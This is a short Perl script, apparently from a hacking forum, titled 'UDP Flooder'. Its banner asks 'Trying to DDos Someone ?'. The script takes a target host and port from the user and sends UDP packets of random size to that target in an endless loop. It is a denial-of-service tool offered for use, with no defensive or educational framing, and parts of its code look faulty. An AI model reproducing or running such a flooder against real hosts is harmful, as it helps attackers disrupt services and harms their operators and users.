#!/usr/bin/perl
use io::socket;
system('cls');
system('title UDP Flooder');
system "color 0e";
print q{
                          _____________________
                         |                     |
                         |     UDP Flooder     |
                         |                     |
                         |    #exploitzone     |
                         |_____________________|
                         |    Trying to DDos   |
                         |      Someone ?      |
                         |_____________________|
                         |                     |
                         | toba567@hotmail.com |
                         |_____________________|
};

print "                         |Host: ";
chop ($host = <stdin>);
print "                         |Port: ";
chop ($port = <stdin>);

{
$sock = IO::Socket::INET->new (
        PeerAddr => $host,
        PeerPort => $port,
        Proto => 'udp') || die "$! err0r ?";
}
packets:
while (1) {
$size = rand() * 200 * 2000;
print ("$host:$port packet size: $size\n");
send($sock, 0, $size);
}
